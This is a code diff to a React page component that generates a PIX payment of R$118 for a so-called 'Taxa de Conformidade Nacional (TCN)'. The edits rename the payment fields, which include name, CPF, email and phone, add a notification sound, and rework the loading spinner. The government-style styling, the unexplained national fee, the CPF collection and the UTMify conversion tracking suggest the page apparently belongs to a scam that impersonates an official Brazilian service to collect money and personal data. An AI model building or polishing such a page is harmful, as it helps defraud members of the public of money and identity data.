@@ -153,12 +153,11 @@ export default function TaxaComplementar() {
       
       // Dados para criação do PIX
       const paymentData = {
-        amount: 118, // R$ 118,00
-        name: dadosSolicitacao.nome,
-        email: dadosSolicitacao.email,
+        nome: dadosSolicitacao.nome,
         cpf: dadosSolicitacao.cpf,
-        phone: dadosSolicitacao.telefone,
-        title: "Taxa de Conformidade Nacional (TCN)"
+        email: dadosSolicitacao.email,
+        telefone: dadosSolicitacao.telefone,
+        valor: 118.00 // R$ 118,00 para TCN
       };
       
       // Chamar API para gerar o PIX
@@ -182,6 +181,9 @@ export default function TaxaComplementar() {
       setPixCode(data.pixCode);
       setPixQrCode(data.pixQrCode);
       setStatus("success");
+      
+      // Tocar som de notificação
+      playNotificationSound();
       
       // Enviar notificação para UTMify
       try {
@@ -375,6 +377,17 @@ export default function TaxaComplementar() {
                           </div>
                           
                           {/* Mostrar conteúdo com base no status do pagamento */}
+                          {status === "loading" && (
+                            <div className="mt-6 flex justify-center">
+                              <div className="text-center">
+                                <div className="inline-block animate-spin text-blue-600 mb-2">
+                                  <Loader className="h-8 w-8" />
+                                </div>
+                                <p className="text-gray-600">Gerando pagamento PIX...</p>
+                              </div>
+                            </div>
+                          )}
+                          
                           {(status === "idle" || status === "error") && (
                             <div className="mt-6">
                               <Button 
@@ -382,14 +395,7 @@ export default function TaxaComplementar() {
                                 className="w-full bg-[#1351B4] hover:bg-[#0B3B8F] text-white py-6 text-lg"
                                 disabled={false}
                               >
-                                {status === "loading" ? (
-                                  <>
-                                    <span className="animate-spin mr-2">⟳</span>
-                                    Gerando pagamento...
-                                  </>
-                                ) : (
-                                  "PROSSEGUIR PARA PAGAMENTO"
-                                )}
+                                PROSSEGUIR PARA PAGAMENTO
                               </Button>
                               <p className="text-xs text-gray-500 mt-2 text-center">
                                 Ao prosseguir, será gerado o PIX para pagamento da Taxa de Conformidade Nacional.
